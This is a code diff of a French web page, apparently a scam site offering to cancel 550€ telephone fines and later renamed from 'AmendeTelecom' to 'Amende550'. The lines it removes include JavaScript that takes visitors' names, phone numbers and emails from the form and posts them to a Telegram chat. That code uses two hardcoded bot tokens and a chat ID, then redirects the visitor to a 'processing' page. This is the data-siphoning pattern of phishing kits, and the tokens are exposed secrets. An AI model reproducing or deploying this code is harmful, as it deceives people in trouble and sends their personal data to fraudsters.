-                        <span id="btnText">Envoyer la Demande</span>
-                    </button>
+                    <button type="submit" class="submit-btn">Envoyer la demande</button>
                 </form>
             </div>
         </div>
     </section>
 
-    <!-- FAQ Section -->
+    <!-- FAQ section -->
     <section class="section" id="faq">
         <div class="container">
             <div class="section-title">
-                <h2>Questions Fréquentes</h2>
-                <p>Trouvez des réponses aux questions les plus courantes sur les amendes téléphoniques.</p>
+                <h2>Questions fréquentes</h2>
             </div>
             
             <div class="faq-item">
                 <div class="faq-question">
-                    <span>Pourquoi mon numéro a-t-il été bloqué ?</span>
+                    <span>Combien de temps prend la procédure ?</span>
                     <i class="fas fa-chevron-down"></i>
                 </div>
                 <div class="faq-answer">
-                    <p>Les opérateurs bloquent les numéros lorsqu'ils détectent des activités suspectes ou frauduleuses associées à ce numéro. Cela inclut généralement des appels ou SMS massifs vers des numéros surtaxés, ou l'utilisation de votre numéro dans des escroqueries. Malheureusement, cela peut parfois arriver à des utilisateurs légitimes dont le numéro a été compromis.</p>
-                </div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">
-                    <span>Dois-je payer l'amende de 550€ ?</span>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="faq-answer">
-                    <p>Non, vous pouvez contester cette amende si vous n'êtes pas responsable des activités frauduleuses. La loi française prévoit des recours pour les utilisateurs victimes de ce type de fraude. C'est précisément ce que nous vous aidons à faire, en préparant un dossier complet de contestation.</p>
+                    <p>En moyenne 7 à 10 jours ouvrés après soumission complète du dossier.</p>
                 </div>
             </div>
             
             <div class="faq-item">
                 <div class="faq-question">
-                    <span>Combien de temps prend le processus ?</span>
+                    <span>Quels documents sont nécessaires ?</span>
                     <i class="fas fa-chevron-down"></i>
                 </div>
                 <div class="faq-answer">
-                    <p>Le temps de traitement varie selon les opérateurs, mais en général, il faut compter entre 7 et 15 jours ouvrables pour obtenir une première réponse. Dans certains cas complexes, cela peut prendre jusqu'à 30 jours. Nous vous tenons informé à chaque étape du processus.</p>
-                </div>
-            </div>
-            
-            <div class="faq-item">
-                <div class="faq-question">
-                    <span>Que se passe-t-il après l'envoi du formulaire ?</span>
-                    <i class="fas fa-chevron-down"></i>
-                </div>
-                <div class="faq-answer">
-                    <p>Notre équipe examine votre demande sous 24 heures, prépare le dossier de contestation complet avec toutes les pièces justificatives nécessaires, et engage les démarches officielles avec votre opérateur. Vous recevrez une copie de tous les documents envoyés et serez informé des prochaines étapes.</p>
+                    <p>Justificatif d'identité et preuve de propriété du numéro.</p>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Footer -->
+    <!-- Footer compact -->
     <footer>
         <div class="container">
             <div class="footer-content">
                 <div class="footer-column">
-                    <h3>AmendeTelecom</h3>
-                    <p>Nous aidons les utilisateurs confrontés à des amendes téléphoniques injustifiées à retrouver l'accès à leurs lignes et à annuler ces pénalités.</p>
-                    <div class="social-links">
-                        <a href="#"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                        <a href="#"><i class="fab fa-instagram"></i></a>
-                    </div>
-                </div>
-                
-                <div class="footer-column">
-                    <h3>Liens Utiles</h3>
-                    <ul class="footer-links">
-                        <li><a href="#problem">Le Problème</a></li>
-                        <li><a href="#process">Le Processus</a></li>
-                        <li><a href="#solution">Notre Solution</a></li>
-                        <li><a href="#form">Formulaire</a></li>
-                        <li><a href="#faq">FAQ</a></li>
-                    </ul>
+                    <h3>Amende550</h3>
+                    <p>Solution rapide pour les amendes téléphoniques injustifiées</p>
                 </div>
                 
                 <div class="footer-column">
                     <h3>Contact</h3>
-                    <p><i class="fas fa-envelope" style="margin-right: 10px;"></i> contact@amendetelecom.fr</p>
-                    <p><i class="fas fa-phone" style="margin-right: 10px;"></i> +33 1 23 45 67 89</p>
-                    <p><i class="fas fa-clock" style="margin-right: 10px;"></i> Lundi-Vendredi: 9h-18h</p>
+                    <ul class="footer-links">
+                        <li><a href="mailto:contact@amende550.fr">contact@amende550.fr</a></li>
+                        <li><a href="#form">Formulaire de contact</a></li>
+                    </ul>
                 </div>
             </div>
             
             <div class="copyright">
-                <p>&copy; 2023 AmendeTelecom. Tous droits réservés.</p>
+                <p>&copy; 2023 Amende550. Tous droits réservés.</p>
             </div>
         </div>
     </footer>
 
-    <!-- Loading Overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">Traitement de votre demande...</div>
-    </div>
-
-    <!-- Floating Action Button -->
-    <div class="fab" id="fab">
-        <i class="fas fa-pen"></i>
-    </div>
-
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Mobile Menu Toggle
-            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
-            const nav = document.getElementById('nav');
-            
-            mobileMenuBtn.addEventListener('click', function() {
-                nav.classList.toggle('active');
-                mobileMenuBtn.innerHTML = nav.classList.contains('active') ? 
-                    '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
-            });
-            
-            // Smooth scrolling for navigation links
-            document.querySelectorAll('nav a').forEach(anchor => {
+            // Smooth scrolling
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
                 anchor.addEventListener('click', function(e) {
                     e.preventDefault();
-                    
-                    // Close mobile menu if open
-                    if (nav.classList.contains('active')) {
-                        nav.classList.remove('active');
-                        mobileMenuBtn.innerHTML = '<i class="fas fa-bars"></i>';
-                    }
-                    
-                    const targetId = this.getAttribute('href');
-                    const targetElement = document.querySelector(targetId);
-                    
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 80,
+                    document.querySelector(this.getAttribute('href')).scrollIntoView({
                         behavior: 'smooth'
                     });
-                    
-                    // Update active link
-                    document.querySelectorAll('nav a').forEach(link => {
-                        link.classList.remove('active');
-                    });
-                    this.classList.add('active');
                 });
             });
             
-            // Header scroll effect
-            const header = document.getElementById('header');
-            window.addEventListener('scroll', function() {
-                if (window.scrollY > 100) {
-                    header.classList.add('scrolled');
-                } else {
-                    header.classList.remove('scrolled');
-                }
-            });
-            
-            // FAQ Accordion
-            const faqItems = document.querySelectorAll('.faq-item');
-            faqItems.forEach(item => {
-                const question = item.querySelector('.faq-question');
+            // FAQ functionality
+            document.querySelectorAll('.faq-question').forEach(question => {
                 question.addEventListener('click', () => {
+                    const item = question.parentElement;
                     item.classList.toggle('active');
                 });
             });
             
-            // Floating Action Button
-            const fab = document.getElementById('fab');
-            fab.addEventListener('click', function() {
-                window.scrollTo({
-                    top: document.getElementById('form').offsetTop - 80,
-                    behavior: 'smooth'
-                });
-            });
-            
-            // Scroll animations
-            function animateOnScroll() {
-                const timelineItems = document.querySelectorAll('.timeline-item');
-                const featureCards = document.querySelectorAll('.feature-card');
-                
-                timelineItems.forEach(item => {
-                    const itemTop = item.getBoundingClientRect().top;
-                    const windowHeight = window.innerHeight;
-                    
-                    if (itemTop < windowHeight - 100) {
-                        item.classList.add('visible');
-                    }
-                });
-                
-                featureCards.forEach(card => {
-                    const cardTop = card.getBoundingClientRect().top;
-                    const windowHeight = window.innerHeight;
-                    
-                    if (cardTop < windowHeight - 100) {
-                        card.classList.add('visible');
-                    }
-                });
-            }
-            
-            // Initial animation trigger
-            window.addEventListener('load', animateOnScroll);
-            window.addEventListener('scroll', animateOnScroll);
-            
-            // Form Validation and Submission
-            const form = document.getElementById('penaltyForm');
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
-            
-            // Bot tokens and chat ID
-            const BOT_TOKENS = [
-                '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw',
-                '7159716957:AAFee9KZfc0VbBqxt2Br_w5CypF4hEY4JkQ'
-            ];
-            const CHAT_ID = '780712584';
-            
-            // Validate phone number (French format)
-            function validatePhoneNumber(phone) {
-                const frenchPhoneRegex = /^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$/;
-                return frenchPhoneRegex.test(phone);
-            }
-            
-            // Validate email
-            function validateEmail(email) {
-                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                return re.test(String(email).toLowerCase());
-            }
-            
-            // Validate form
-            function validateForm() {
-                let isValid = true;
-                const username = document.getElementById('username').value.trim();
-                const phone = document.getElementById('phone').value.trim();
-                const email = document.getElementById('email').value.trim();
-                
-                // Validate username
-                if (username === '') {
-                    document.getElementById('usernameError').style.display = 'block';
-                    document.getElementById('username').classList.add('invalid');
-                    isValid = false;
-                } else {
-                    document.getElementById('usernameError').style.display = 'none';
-                    document.getElementById('username').classList.remove('invalid');
-                }
-                
-                // Validate phone
-                if (!validatePhoneNumber(phone)) {
-                    document.getElementById('phoneError').style.display = 'block';
-                    document.getElementById('phone').classList.add('invalid');
-                    isValid = false;
-                } else {
-                    document.getElementById('phoneError').style.display = 'none';
-                    document.getElementById('phone').classList.remove('invalid');
-                }
-                
-                // Validate email
-                if (!validateEmail(email)) {
-                    document.getElementById('emailError').style.display = 'block';
-                    document.getElementById('email').classList.add('invalid');
-                    isValid = false;
-                } else {
-                    document.getElementById('emailError').style.display = 'none';
-                    document.getElementById('email').classList.remove('invalid');
-                }
-                
-                return isValid;
-            }
-            
-            // Encrypt data (simplified for example)
-            function encryptData(data) {
-                // In a real application, use more secure encryption like AES
-                return btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-            }
-            
-            // Send data to Telegram bot
-            async function sendToTelegram(data) {
-                const timestamp = new Date().toLocaleString('fr-FR');
-                const encryptedData = encryptData({...data, timestamp});
-                
-                const message = `
-🆕 *Nouvelle Demande d'Annulation d'Amende* 🚨
-
-👤 *Nom*: ${data.username}
-📱 *Téléphone*: ${data.phone}
-📧 *Email*: ${data.email}
-🕒 *Date*: ${timestamp}
-
-🔐 *Données Cryptées*: \`${encryptedData}\`
-                `;
-                
-                // Try each bot until one succeeds
-                for (const token of BOT_TOKENS) {
-                    try {
-                        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chat_id: CHAT_ID,
-                                text: message,
-                                parse_mode: 'Markdown'
-                            })
-                        });
-                        
-                        if (response.ok) {
-                            return true;
-                        }
-                    } catch (error) {
-                        console.error(`Error with bot ${token}:`, error);
-                    }
-                }
-                
-                return false;
-            }
-            
-            // Save data to localStorage
-            function saveDataLocally(data) {
-                try {
-                    const timestamp = new Date().toISOString();
-                    const submissions = JSON.parse(localStorage.getItem('amendeSubmissions') || '[]');
-                    submissions.push({...data, timestamp});
-                    localStorage.setItem('amendeSubmissions', JSON.stringify(submissions));
-                    return true;
-                } catch (error) {
-                    console.error('Error saving data:', error);
-                    return false;
-                }
-            }
-            
             // Form submission
-            form.addEventListener('submit', async function(e) {
+            const form = document.getElementById('penaltyForm');
+            form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                if (!validateForm()) {
+                // Basic validation
+                const phone = document.getElementById('phone').value;
+                const frenchPhoneRegex = /^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$/;
+                
+                if (!frenchPhoneRegex.test(phone)) {
+                    alert('Veuillez entrer un numéro de téléphone français valide');
                     return;
                 }
                 
-                const formData = {
-                    username: document.getElementById('username').value.trim(),
-                    phone: document.getElementById('phone').value.trim(),
-                    email: document.getElementById('email').value.trim()
-                };
-                
-                // Show loading state
-                submitBtn.classList.add('loading');
-                btnText.textContent = 'Traitement en cours...';
-                
-                try {
-                    // Save data locally
-                    const localSaveSuccess = saveDataLocally(formData);
-                    
-                    // Send to Telegram
-                    const telegramSuccess = await sendToTelegram(formData);
-                    
-                    if (!telegramSuccess) {
-                        console.warn('Failed to send to Telegram');
-                    }
-                    
-                    // Show loading overlay
-                    loadingOverlay.classList.add('active');
-                    
-                    // Wait for 4 seconds before redirecting
-                    await new Promise(resolve => setTimeout(resolve, 4000));
-                    
-                    // Redirect to traitement.html
+                // Simulate form processing
+                setTimeout(() => {
                     window.location.href = 'traitement.html';
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('Une erreur est survenue. Veuillez réessayer.');
-                } finally {
-                    submitBtn.classList.remove('loading');
-                    btnText.textContent = 'Envoyer la Demande';
-                }
+                }, 1000);
             });
             
             // Phone number formatting
@@ -1452,20 +657,6 @@
                     // Keep as is
                 } else if (value.length > 0) {
                     value = '0' + value;
-                }
-                
-                // Format with spaces
-                if (value.length > 2) {
-                    value = value.substring(0, 2) + ' ' + value.substring(2);
-                }
-                if (value.length > 5) {
-                    value = value.substring(0, 5) + ' ' + value.substring(5);
-                }
-                if (value.length > 8) {
-                    value = value.substring(0, 8) + ' ' + value.substring(8);
-                }
-                if (value.length > 11) {
-                    value = value.substring(0, 11) + ' ' + value.substring(11);
                 }
                 
                 e.target.value = value;
